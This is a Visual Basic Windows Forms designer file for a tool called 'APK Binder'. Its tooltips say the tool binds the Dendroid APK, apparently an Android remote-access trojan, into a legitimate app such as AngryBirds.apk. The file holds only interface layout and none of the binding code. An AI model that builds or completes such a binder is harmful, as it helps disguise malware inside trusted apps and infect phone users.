<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Form1
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Me.ToolTip1 = New System.Windows.Forms.ToolTip(Me.components)
        Me.ReactorGroupBox2 = New APKBinder.ReactorGroupBox()
        Me.SourceApkPath = New APKBinder.ReactorTextBox()
        Me.ToolTip2 = New System.Windows.Forms.ToolTip(Me.components)
        Me.ReactorGroupBox3 = New APKBinder.ReactorGroupBox()
        Me.TargetApkPath = New APKBinder.ReactorTextBox()
        Me.ToolTip3 = New System.Windows.Forms.ToolTip(Me.components)
        Me.ReactorTheme1 = New APKBinder.ReactorTheme()
        Me.ReactorGroupBox1 = New APKBinder.ReactorGroupBox()
        Me.Log = New APKBinder.ReactorMultiLineTextBox()
        Me.ReactorButton1 = New APKBinder.ReactorButton()
        Me.ReactorGroupBox2.SuspendLayout()
        Me.ReactorGroupBox3.SuspendLayout()
        Me.ReactorTheme1.SuspendLayout()
        Me.ReactorGroupBox1.SuspendLayout()
        Me.SuspendLayout()
        '
        'ToolTip1
        '
        Me.ToolTip1.AutoPopDelay = 15000
        Me.ToolTip1.InitialDelay = 500
        Me.ToolTip1.ReshowDelay = 100
        Me.ToolTip1.ToolTipIcon = System.Windows.Forms.ToolTipIcon.Info
        Me.ToolTip1.ToolTipTitle = "Source.APK Location"
        '
        'ReactorGroupBox2
        '
        Me.ReactorGroupBox2.BackColor = System.Drawing.Color.FromArgb(CType(CType(33, Byte), Integer), CType(CType(33, Byte), Integer), CType(CType(33, Byte), Integer))
        Me.ReactorGroupBox2.Controls.Add(Me.SourceApkPath)
        Me.ReactorGroupBox2.Location = New System.Drawing.Point(27, 46)
        Me.ReactorGroupBox2.Name = "ReactorGroupBox2"
        Me.ReactorGroupBox2.Size = New System.Drawing.Size(308, 66)
        Me.ReactorGroupBox2.TabIndex = 8
        Me.ReactorGroupBox2.Text = "Source APK"
        Me.ToolTip1.SetToolTip(Me.ReactorGroupBox2, "Click the textbox to select the original Dendroid.apk file to be used in this bin" &
        "d!")
        '
        'SourceApkPath
        '
        Me.SourceApkPath.BackColor = System.Drawing.Color.FromArgb(CType(CType(37, Byte), Integer), CType(CType(37, Byte), Integer), CType(CType(37, Byte), Integer))
        Me.SourceApkPath.ForeColor = System.Drawing.Color.White
        Me.SourceApkPath.Location = New System.Drawing.Point(9, 30)
        Me.SourceApkPath.MaxCharacters = 32767
        Me.SourceApkPath.Name = "SourceApkPath"
        Me.SourceApkPath.Size = New System.Drawing.Size(290, 22)
        Me.SourceApkPath.TabIndex = 3
        Me.SourceApkPath.Text = "C:\Source.apk"
        Me.SourceApkPath.TextAlign = System.Windows.Forms.HorizontalAlignment.Left
        Me.SourceApkPath.UsePasswordMask = False
        '
        'ToolTip2
        '
        Me.ToolTip2.AutoPopDelay = 15000
        Me.ToolTip2.InitialDelay = 500
        Me.ToolTip2.ReshowDelay = 100
        Me.ToolTip2.ToolTipIcon = System.Windows.Forms.ToolTipIcon.Info
        Me.ToolTip2.ToolTipTitle = "Target APK Location"
        '
        'ReactorGroupBox3
        '
        Me.ReactorGroupBox3.BackColor = System.Drawing.Color.FromArgb(CType(CType(33, Byte), Integer), CType(CType(33, Byte), Integer), CType(CType(33, Byte), Integer))
        Me.ReactorGroupBox3.Controls.Add(Me.TargetApkPath)
        Me.ReactorGroupBox3.Location = New System.Drawing.Point(27, 118)
        Me.ReactorGroupBox3.Name = "ReactorGroupBox3"
        Me.ReactorGroupBox3.Size = New System.Drawing.Size(308, 85)
        Me.ReactorGroupBox3.TabIndex = 9
        Me.ReactorGroupBox3.Text = "Target APK"
        Me.ToolTip2.SetToolTip(Me.ReactorGroupBox3, "Click the text box to select the Legitimate apk file to bind dendroid to!")
        '
        'TargetApkPath
        '
        Me.TargetApkPath.BackColor = System.Drawing.Color.FromArgb(CType(CType(37, Byte), Integer), CType(CType(37, Byte), Integer), CType(CType(37, Byte), Integer))
        Me.TargetApkPath.ForeColor = System.Drawing.Color.White
        Me.TargetApkPath.Location = New System.Drawing.Point(9, 39)
        Me.TargetApkPath.MaxCharacters = 32767
        Me.TargetApkPath.Name = "TargetApkPath"
        Me.TargetApkPath.Size = New System.Drawing.Size(290, 22)
        Me.TargetApkPath.TabIndex = 5
        Me.TargetApkPath.Text = "C:\AngryBirds.apk"
        Me.TargetApkPath.TextAlign = System.Windows.Forms.HorizontalAlignment.Left
        Me.TargetApkPath.UsePasswordMask = False
        '
        'ToolTip3
        '
        Me.ToolTip3.ToolTipIcon = System.Windows.Forms.ToolTipIcon.Warning
        Me.ToolTip3.ToolTipTitle = "Start Binding"
        '
        'ReactorTheme1
        '
        Me.ReactorTheme1.Controls.Add(Me.ReactorButton1)
        Me.ReactorTheme1.Controls.Add(Me.ReactorGroupBox2)
        Me.ReactorTheme1.Controls.Add(Me.ReactorGroupBox3)
        Me.ReactorTheme1.Controls.Add(Me.ReactorGroupBox1)
        Me.ReactorTheme1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.ReactorTheme1.Font = New System.Drawing.Font("Verdana", 6.75!)
        Me.ReactorTheme1.Location = New System.Drawing.Point(0, 0)
        Me.ReactorTheme1.Name = "ReactorTheme1"
        Me.ReactorTheme1.Size = New System.Drawing.Size(371, 392)
        Me.ReactorTheme1.TabIndex = 0
        Me.ReactorTheme1.Text = "APK Binder"
        '
        'ReactorGroupBox1
        '
        Me.ReactorGroupBox1.BackColor = System.Drawing.Color.FromArgb(CType(CType(33, Byte), Integer), CType(CType(33, Byte), Integer), CType(CType(33, Byte), Integer))
        Me.ReactorGroupBox1.Controls.Add(Me.Log)
        Me.ReactorGroupBox1.Location = New System.Drawing.Point(27, 249)
        Me.ReactorGroupBox1.Name = "ReactorGroupBox1"
        Me.ReactorGroupBox1.Size = New System.Drawing.Size(308, 131)
        Me.ReactorGroupBox1.TabIndex = 7
        Me.ReactorGroupBox1.Text = "Log"
        '
        'Log
        '
        Me.Log.BackColor = System.Drawing.Color.FromArgb(CType(CType(37, Byte), Integer), CType(CType(37, Byte), Integer), CType(CType(37, Byte), Integer))
        Me.Log.ForeColor = System.Drawing.Color.White
        Me.Log.Location = New System.Drawing.Point(9, 31)
        Me.Log.MaxCharacters = 32767
        Me.Log.Name = "Log"
        Me.Log.SelectionStart = 0
        Me.Log.Size = New System.Drawing.Size(290, 89)
        Me.Log.TabIndex = 0
        Me.Log.TextAlign = System.Windows.Forms.HorizontalAlignment.Left
        Me.Log.TextLength = 0
        '
        'ReactorButton1
        '
        Me.ReactorButton1.BackColor = System.Drawing.Color.FromArgb(CType(CType(38, Byte), Integer), CType(CType(38, Byte), Integer), CType(CType(38, Byte), Integer))
        Me.ReactorButton1.Font = New System.Drawing.Font("Verdana", 6.75!)
        Me.ReactorButton1.Location = New System.Drawing.Point(27, 209)
        Me.ReactorButton1.Name = "ReactorButton1"
        Me.ReactorButton1.Size = New System.Drawing.Size(308, 34)
        Me.ReactorButton1.TabIndex = 10
        Me.ReactorButton1.Text = "Run"
        '
        'Form1
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(371, 392)
        Me.Controls.Add(Me.ReactorTheme1)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.Name = "Form1"
        Me.Text = "Form1"
        Me.ReactorGroupBox2.ResumeLayout(False)
        Me.ReactorGroupBox3.ResumeLayout(False)
        Me.ReactorTheme1.ResumeLayout(False)
        Me.ReactorGroupBox1.ResumeLayout(False)
        Me.ResumeLayout(False)

    End Sub
    Friend WithEvents ReactorTheme1 As APKBinder.ReactorTheme
    Friend WithEvents ReactorGroupBox3 As APKBinder.ReactorGroupBox
    Friend WithEvents TargetApkPath As APKBinder.ReactorTextBox
    Friend WithEvents ReactorGroupBox2 As APKBinder.ReactorGroupBox
    Friend WithEvents SourceApkPath As APKBinder.ReactorTextBox
    Friend WithEvents ReactorGroupBox1 As APKBinder.ReactorGroupBox
    Friend WithEvents Log As APKBinder.ReactorMultiLineTextBox
    Friend WithEvents ToolTip1 As System.Windows.Forms.ToolTip
    Friend WithEvents ToolTip2 As System.Windows.Forms.ToolTip
    Friend WithEvents ToolTip3 As System.Windows.Forms.ToolTip
    Friend WithEvents ReactorButton1 As ReactorButton
End Class
